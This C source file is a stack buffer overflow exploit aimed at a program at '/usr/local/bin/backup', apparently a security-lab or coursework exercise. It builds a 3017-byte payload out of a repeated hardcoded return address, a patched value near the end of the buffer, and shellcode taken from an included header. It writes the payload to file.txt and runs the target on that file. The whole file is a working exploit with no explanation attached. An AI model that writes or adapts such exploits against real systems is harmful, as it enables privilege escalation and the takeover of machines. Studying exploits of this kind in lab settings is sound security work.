#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/backup"
#define BUFFER_SIZE 3017

int main(void) {
  char *args[4];
  char *env[1];
  char *buff, *ptr;
  long *addr_ptr, addr;
  int bsize = BUFFER_SIZE;
  int i;
  FILE *f = fopen("file.txt", "w");

  if (!(buff = malloc(bsize))) {
    printf("Cannot allocate memory.\n");
    exit(0);
  }

  addr = (long)0xffbfd198;

  ptr = buff;
  addr_ptr = (long *)ptr;
  for (i = 0; i < bsize; i += 4) {
    if (i == 3004) {
      *(addr_ptr++) = (long)0x00000bbc;
      continue;
    }
    *(addr_ptr++) = addr;
  }

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  if (f == NULL) {
    printf("Error when open file\n");
    exit(1);
  }

  for (i = 0; i < bsize; i++) {
    fprintf(f, "%c", buff[i]);
  }

  fclose(f);

  args[0] = TARGET; args[1] = "backup";
  args[2] = "file.txt"; args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}

